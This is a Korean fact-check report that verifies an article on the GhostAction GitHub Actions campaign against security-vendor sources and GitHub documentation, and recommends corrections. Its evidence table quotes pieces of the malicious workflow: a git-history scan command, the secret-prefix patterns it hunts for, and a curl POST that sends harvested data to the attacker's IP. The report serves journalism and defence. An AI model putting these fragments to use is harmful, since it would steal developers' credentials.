# Fact Check Report: 2026-10-17-ghostaction-workflow-git-history-secrets

검증일: 2026-10-16 / 발행 예정일: 2026-10-17 (KST)
검증자: fact-checker (1차 출처 직접 대조 + 교차 확인)

## A. 시점 일관성 (최우선 검사)

- **발행일:** 2026-10-17 (KST)
- **본문에서 언급된 날짜·이벤트**

| 인용된 사건 | 본문 표현 | 실제 일자 | 발행일 대비 | 판정 |
|---|---|---|---|---|
| 고스트액션 최초 관측 | "2025년 9월에 처음 관측" | 2025-09 (GitGuardian·StepSecurity 모두 일치) | 이전 ✓ | 유지 |
| 1차 파동 기간 | "8월 31일~9월 30일" | 2026-08-31 ~ 09-30 | 이전 ✓ | 유지 (표현만 보완 권고, C-4) |
| 깃허브 실행 차단 개시 | "10월 9일부터는 실행 자체를 막기 시작" | 2026-10-09 | 이전 ✓ | 유지 |
| 10월 파동 | "10일과 12일 파동" | 2026-10-10, 10-12 | 이전 ✓ | 유지 |
| GitGuardian 집계 갱신 | "10월 13일 갱신한 집계" | 2026-10-13 업데이트 (원문 10-07 게시) | 이전 ✓ | 유지 |

- **사후 시점 표현 검사:** "훗날 드러나듯", "결국", "돌이켜보면" 등 **없음** ✓
- **시제 혼동:** 과거 사건은 모두 과거형, 현재 상태("사실상 멈춘 적이 없습니다", "히스토리에 한 번 들어간 키는 … 없습니다")는 현재형으로 정확히 구분됨. 예정·전망을 과거로 쓴 곳 없음 ✓
- **용어 시점성:** `fetch-depth`, `git log -p --all`, `workflow_dispatch`, `sk-ant-`/`sk-proj-`/`sk-or-` 모두 발행일 이전에 존재 ✓
- **커버 스크린샷 시점:** 커버 이미지에 "Oct 10, 2026, 7:44 PM GMT+2", "Triggered via push 3 days ago"가 찍혀 있어 10-13 업데이트 시점과 정합 ✓

**판정: 시점 규율 위반 없음.**

## B. 사실 검증

| # | 주장(본문 표현) | 상태 | 증거 | 조치 |
|---|---|---|---|---|
| 1 | 저장소 "3만여 곳" | ✓ 확인 | GitGuardian 10-13 업데이트: "more than 30,000 repositories" | - (제목의 "3만 곳"은 C-6) |
| 2 | 사용자·조직 "약 3,000곳" | ✓ 확인 | 같은 업데이트: "about 3,000 users and orgs" | - |
| 3 | 동원된 깃허브 계정 "약 1,900개" | ✓ 확인 | 같은 업데이트: "about 1,900 compromised GitHub accounts". 본문의 "동원된"은 StepSecurity의 "compromised accounts (used for injection, not attacker-owned)" 성격과도 부합 | - |
| 4 | 파일명 `security-audit.yml` | ✓ 확인 | StepSecurity IOC 목록 + GitGuardian 10-09 업데이트 + **레포의 커버 스크린샷 자체에 `security-audit.yml` 표시** | - |
| 5 | 커밋 메시지 "Add security audit workflow" | ✓ 확인 | StepSecurity IOC: "Add security audit workflow"; Socket도 동일 | - |
| 6 | 고스트액션 2025년 9월 최초 관측 | ✓ 확인 | GitGuardian: "alerted to the original GhostAction campaign in September 2025 … 817 repos / 327 users / 3,325 secrets"; StepSecurity 동일 | - |
| 7 | "사실상 멈춘 적이 없습니다" | ✓ 확인 | GitGuardian의 C2 연혁: 2025-09 도메인 → 170.39.218.2 (2025-10~2026-04) → *.oast.fun (2025-11, 2026-03~04) → 193.32.204.199 (2026-08~) | - |
| 8 | 트리거 `on: push`(필터 없음) + `workflow_dispatch` | ✓ 확인 | StepSecurity: "Triggers: `workflow_dispatch` and an unfiltered `push` on any branch or tag"; 커버 스크린샷에도 `on: push` | - |
| 9 | 깃허브 로그 마스킹의 사정거리 요약 | ✓ 확인 (원문과 어긋남 없음) | 공식 문서 원문: "GitHub Actions automatically redacts the contents of all GitHub secrets that are printed to workflow logs" / **"Because there are multiple ways a secret value can be transformed, this redaction is not guaranteed."** 본문 요약과 1:1 대응 | - |
| 10 | "워크플로가 명시적으로 포함할 때만 읽어 준다" | ✓ 확인 | 공식 문서: "GitHub Actions can only read a secret if you explicitly include the secret in a workflow" | - |
| 11 | 러너 밖 네트워크 전송은 보호 대상 아님 | ✓ 확인 | 공식 문서는 유출 경로를 다루지 않음(마스킹만 약속). 실제 캠페인이 `curl` POST로 유출한 것이 반증 | - |
| 12 | 공격자가 기존 워크플로에서 시크릿 '이름'을 먼저 읽어 페이로드에 박음 | ✓ 확인 | StepSecurity: "When reconnaissance finds configured secrets, they are templated into a URL-encoded body"(마커 `c=monami`), 없으면 `c=new` | - |
| 13 | kitao/pyxel 사례의 시크릿 이름이 **네 개** | ✓ 확인 | Socket: `CARGO_REGISTRY_TOKEN`, `PERSONAL_ACCESS_TOKEN`, `PYPI_PASSWORD`, `PYPI_USERNAME` = 4개 (socket.dev 직접 요청은 403, WebSearch로 확인) | - |
| 14 | pyxel = 게임 엔진 저장소 | ✓ 확인 | kitao/pyxel은 파이썬용 레트로 게임 엔진 | - |
| 15 | `actions/checkout` `fetch-depth` 기본값 1, 0은 전체 히스토리 | ✓ 확인 | README 원문: "Number of commits to fetch. 0 indicates all history for all branches and tags." / "Default: 1" | - |
| 16 | 10월 변종에 `fetch-depth: 0` | ✓ 확인 | GitGuardian·StepSecurity·The Hacker News 3곳 일치 | - |
| 17 | `git log -p --all`로 전체 히스토리 diff | ⚠ 근거 약함(과장) | 실제 페이로드는 `git log -p --all \| head -200000`, 매치는 `head -300`까지만 보관. "처음부터 끝까지 훑는"은 사실상 상한이 있음 | C-2 완화 권고 |
| 18 | "13종의 정규식" | ✓ 확인 (단, 출처 불일치 존재) | StepSecurity가 13개를 열거(AKIA/ASIA/sk-ant-/sk-proj-/sk-or-/ghp_/github_pat_/glpat-/AIza/xox[baprs]-/SG./AWS 시크릿 키/AWS 세션 토큰), The Hacker News도 13. **단 GitGuardian은 "11 secret-detection regexes"로 적음** | C-5 참고 (수정 불필요, 필요 시 출처 명기) |
| 19 | 정규식 범주 열거(AWS 액세스 키, 깃허브·GitLab 토큰, 구글·Slack·SendGrid) | ✓ 확인 | StepSecurity 13종 목록과 일치 | - |
| 20 | `sk-ant-`/`sk-proj-`/`sk-or-` = 앤트로픽·오픈AI·OpenRouter | ✓ 확인 | StepSecurity 목록의 각 주석과 일치 | - |
| 21 | AWS 액세스 키 ID 앞뒤 2줄 컨텍스트 | ✓ 확인 | StepSecurity: "Two lines of context around each `AKIA`/`ASIA` hit … `AKIA_CTX_START`/`AKIA_CTX_END`"; GitGuardian도 컨텍스트 캡처 언급 | - |
| 22 | 하드코딩 IP로 평문 HTTP POST 1회, DNS 질의 없음 | ✓ 확인 | StepSecurity: `curl -s -m 20 -X POST --data-binary`로 `http://193.32.204.199/?c=new`, "over plain HTTP to a raw IP with no DNS query". GitGuardian·THN도 동일 IP | - (포트 3000 변종 존재는 생략해도 무방) |
| 23 | 1차 파동 실행 3,669번 / 완료 336번 / 13개 저장소 26개 유출 | ⚠ 수치는 정확, 서술 단계 생략 | GitGuardian 원문: "of the 3,669 runs we collected across 605 repositories, **only 499 executed, in 32 repositories**" / "336 runs completed successfully, exfiltrating 26 secrets from 13 repositories" | C-3 (499/32 단계 보완 권고) |
| 24 | "대부분은 깃허브가 승인 대기 상태로 붙잡아 뒀거든요" | ✓ 확인 | GitGuardian: "GitHub held most runs for approval" | - |
| 25 | 깃허브가 10월 9일부터 실행 차단, 10/10·10/12 파동은 시크릿 0건 | ✓ 확인 | GitGuardian 10-13 업데이트: "Waves on Oct. 10 and Oct. 12 did not execute: GitHub began blocking the workflow from running starting October 9." 커버 스크린샷의 "GitHub detected that this workflow file may be malicious"가 그 차단 화면 | - |
| 26 | 한 계정에서 포크 279개에 같은 파일 | ✓ 수치 확인 / ✗ **해석 오류** | StepSecurity·Socket: henrywoo 계정 318곳 = 원본 39 + **그 계정 소유의 포크 279**. 즉 공격자가 장악한 계정이 **자기 네임스페이스의 포크**에 심은 것이지, 제3자가 받아 간 포크가 아님 | **C-1 (치명적) 수정 필요** |
| 27 | "유출을 실제로 막은 것으로 관측된 통제는 … 승인 요구 하나뿐" | ⚠ 출처 범위 초과 | StepSecurity 원문은 `typecho-fans/plugins` 사례에 대해 "the single control observed stopping the campaign **that week**"(10/7~10/9 주간) — '이번 캠페인 전체'가 아님. 더욱이 본문 자신이 바로 앞 문단에서 "깃허브가 승인 대기로 붙잡아 뒀다"를 서술해 자가당착 | **C-2 (중대) 범위 한정 필요** |
| 28 | 본문 중간 이미지(시크릿 이름 분포, SSH_PRIVATE_KEY 최다) | ✓ 확인 | GitGuardian 원문 차트 "Number of secret names observed"가 실재. 레포 파일 `public/images/inline/ghostaction-secret-names.jpg` 실물 확인 결과 SSH_PRIVATE_KEY 41로 1위, 이하 DOCKERHUB_TOKEN 22, AWS_SECRET_ACCESS_KEY 20 | - |
| 29 | 커버 크레딧 "악성 워크플로의 실행을 깃허브가 보류시킨 화면 — GitGuardian" | ✓ 확인 | 커버 파일 실물이 해당 화면이며 `_workspace/image-credits-2026.md` 143행과 일치. `coverImage: ""`지만 `public/images/covers/{slug}.jpg` 파일명 매칭으로 렌더되므로 크레딧 줄이 있는 것이 맞음 | - |
| 30 | 깃의 삭제는 새 커밋 추가이고 블롭이 여전히 도달 가능 | ✓ 확인 | 깃 자료구조상 사실. StepSecurity도 과거 커밋에서 자격증명이 회수된다는 취지로 서술 | - |

## C. 수정 권고 (우선순위 순)

### C-1. [치명적] 33줄 — 포크 279개의 방향이 뒤집혀 있음

현재 문장:
> 한 계정에서만 포크 279개에 같은 파일이 들어갔는데, 포크를 받아 둔 쪽에서 액션을 켜는 순간 그건 내 계정에서 도는 워크플로가 되거든요.

279개는 **장악당한 계정(henrywoo)이 자기 계정에 떠 둔 포크**다(318곳 = 원본 39 + 포크 279). 제3자가 그 저장소를 포크해 갔다는 뜻이 아니다. 따라서 "포크를 받아 둔 쪽에서 액션을 켜는 순간"이라는 인과는 이 숫자가 보여 주는 것과 다르다. 수치 자릿수는 맞지만 **사실관계의 방향이 반대**이므로 치명적으로 분류한다.

권고 수정안(택1):

(a) 숫자의 실제 의미대로 고쳐 쓰기
> 계정 하나가 뚫리면 그 계정이 쓰기 권한을 가진 저장소가 전부 범위에 들어옵니다. 한 계정에서 318곳이 한꺼번에 당했는데 그중 279곳은 그 사람이 떠 둔 포크였어요. 평소에 신경 쓰지 않던 포크까지 전부 '내가 커밋할 수 있는 저장소'로 세어진 겁니다.

(b) 포크 쪽 일반론을 유지하려면 279라는 숫자와 분리할 것 — 즉 "포크를 받아 둔 쪽에서 액션을 켜면 내 계정에서 돈다"는 문장은 남기되 279를 근거로 삼지 않는다.

(a)를 권한다. 글의 "자격증명이 어디까지 닿는가"라는 축에 더 맞고 출처와도 일치한다.

### C-2. [중대] 33줄 — "하나뿐이었습니다"의 범위

현재 문장:
> 이번 캠페인에서 유출을 실제로 막은 것으로 관측된 통제는 저장소가 워크플로 실행에 승인을 요구하도록 해 둔 경우 하나뿐이었습니다.

StepSecurity 원문은 `typecho-fans/plugins` 한 건을 두고 "**그 주**(10/7~10/9) 이 캠페인의 유출을 막은 것으로 관측된 유일한 통제"라고 썼다. '이번 캠페인' 전체로 넓히면 (가) 출처 범위를 벗어나고, (나) 29줄의 "대부분은 깃허브가 승인 대기 상태로 붙잡아 뒀거든요"·"10월 9일부터는 실행 자체를 막기 시작했고"와 충돌한다(깃허브의 플랫폼 차단도 유출을 막은 통제다).

권고 수정안:
> 깃허브가 손을 쓰기 전인 10월 초만 놓고 보면, 유출을 막은 것으로 관측된 저장소 쪽 설정은 워크플로 실행에 승인을 요구해 둔 경우 하나뿐이었습니다.

### C-3. [경미] 29줄 — 실행 통계의 중간 단계

현재: "실행이 3,669번 걸렸는데 끝까지 완료된 것은 336번"
원문은 3,669건이 **수집된 실행 기록**이고 실제로 돈 것은 32개 저장소의 **499번**, 그중 336번이 완료다. 현재 표현도 틀렸다고 보긴 어렵지만("걸렸다"=큐에 잡혔다), 3,669 → 336의 낙차를 전부 승인 대기로 읽게 만든다.

권고: "실행 기록이 3,669건 쌓였는데 실제로 돈 것은 32개 저장소의 499번, 끝까지 완료된 것은 336번, 유출로 확인된 시크릿은 13개 저장소의 26개였습니다."

### C-4. [경미] 29줄 — "1차 파동"의 지시 대상

12줄에서 "2025년 9월에 처음 관측"이라고 해 두고 29줄에서 "1차 파동(8월 31일~9월 30일)"이라고 쓰면, 독자가 2025년 9월을 1차 파동으로 읽을 수 있다. GitGuardian도 이 구간을 "first wave"로 명명하지는 않았다.

권고: "GitGuardian이 올해 8월 31일부터 9월 30일까지의 파동을 실측해 보니" 로 교체.

### C-5. [경미] 27·31줄 — "13종"의 출처 불일치 (수정 불필요, 알고만 있을 것)

StepSecurity와 The Hacker News는 13종, GitGuardian은 11종으로 적었다(GitGuardian은 히스토리 스캔에 쓰인 정규식만 센 것으로 보인다). 본문의 13은 실제로 열거 가능한 StepSecurity 목록과 일치하므로 유지해도 된다. 독자가 GitGuardian 원문을 열어 볼 가능성이 있으니 한 군데 정도 "StepSecurity가 뜯어 본 변종 기준"을 넣으면 더 안전하다.

### C-6. [경미] 3줄(제목) — "3만 곳" vs 본문 "3만여 곳"

원문은 "more than 30,000"이다. 제목은 길이 제약이 있으니 그대로 둬도 무방하나, 본문과 맞추려면 "3만여 곳"이 정확하다(제목 27→28자, 규칙 내).

### C-7. [경미] 25줄 — `git log -p --all`의 사정거리

"전체 히스토리의 diff를 처음부터 끝까지 훑는 명령이에요"는 명령어 자체의 설명으로는 맞지만, 실제 페이로드는 `| head -200000`으로 잘라 읽고 매치도 300건까지만 보관한다. 치명적이진 않다. 정확히 쓰려면 "전체 히스토리의 diff를 앞에서부터 20만 줄까지 훑습니다" 정도.

### C-8. [참고] 16줄 — "기본 브랜치에 올라오는 순간"

`on: push`는 기본 브랜치에 한정되지 않고 푸시된 브랜치/태그에서 그 브랜치 버전의 워크플로가 돈다(이번 변종은 브랜치 필터가 없어 더 넓다). 실제 캠페인이 기본 브랜치를 노렸으므로 서술 자체는 사실과 어긋나지 않는다. 손대지 않아도 되는 수준.

## D. 종합 판정

- [ ] 발행 가능
- [x] **수정 후 발행** — C-1(치명적 1건), C-2(중대 1건)을 고치면 발행 가능. C-3~C-7은 선택.
- [ ] 발행 보류

**요약:** 시점 규율 위반 없음. 숫자(3만여/3,000/1,900/3,669/336/26/13개 저장소/279/13종/fetch-depth 1·0), 고유명사(`security-audit.yml`, "Add security audit workflow", kitao/pyxel, 시크릿 이름 4개, `sk-ant-`·`sk-proj-`·`sk-or-`, 193.32.204.199), 날짜(2025-09 최초 관측, 10-09 차단 개시, 10-10·10-12 파동, 10-13 갱신), 깃허브 공식 문서 인용 요약, 본문 이미지와 커버 크레딧까지 모두 1차 출처와 일치한다. 고칠 곳은 두 군데 — **포크 279개의 주체가 뒤집혀 있는 것(C-1)**과 **"막은 통제는 하나뿐"의 범위가 출처를 넘고 본문 앞 문단과 충돌하는 것(C-2)**.
